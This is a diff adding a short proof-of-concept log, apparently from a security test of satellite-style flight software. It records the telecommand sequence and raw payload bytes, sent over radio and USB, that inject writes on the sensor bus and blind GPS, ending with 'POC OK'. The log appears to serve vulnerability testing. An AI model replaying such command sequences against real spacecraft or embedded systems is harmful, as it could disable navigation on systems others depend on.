@@ -1,0 +1,32 @@
+[   0.000] ========================================================================
+[   0.000] V-26 sensor bus injection / GPS blinding
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x1B via=radio AES  payload=010300
+[   0.000] <-- TM apid=0x1B clear len=8
+[   0.001] --> TC apid=0x0C via=usb AES  payload=-
+[   0.001] <-- TM apid=0x0C AES len=27
+[   0.001] --> advance(15000 ms)
+[   0.002] 15 s window with mask=0: mission TM frames = 0
+[   0.002] --> TC apid=0x1B via=radio AES  payload=010303
+[   0.002] <-- TM apid=0x1B clear len=8
+[   0.002] --> advance(15000 ms)
+[   0.003] <-- TM apid=0x01 AES len=8
+[   0.003] <-- TM apid=0x0E AES len=30
+[   0.004] <-- TM apid=0x08 AES len=20
+[   0.004] <-- TM apid=0x3FF AES len=14
+[   0.004] --> TC apid=0x1A via=radio AES  payload=4b00000000000000000000000000000000000000000000000000000000000000
+[   0.005] <-- TM apid=0x1A clear len=8
+[   0.005] --> TC apid=0x18 via=radio AES  payload=00200020004001400100
+[   0.005] <-- TM apid=0x18 clear len=12
+[   0.005] --> TC apid=0x0E via=usb AES  payload=-
+[   0.006] <-- TM apid=0x0E AES len=30
+[   0.006] GET_NAV after GPIO poke: status=0x10 sats=0 lat=0
+[   0.006] --> TC apid=0x11 via=radio AES  payload=01
+[   0.007] <-- TM apid=0x09 AES len=21
+[   0.007] <-- TM apid=0x11 AES len=9
+[   0.007] --> POWER CYCLE (scratch + SRAM die, flash survives)
+[   0.007] --> TC apid=0x0E via=usb AES  payload=-
+[   0.008] <-- TM apid=0x0E AES len=30
+[   0.008] ========================================================================
+[   0.008] POC OK
+[   0.008] ========================================================================
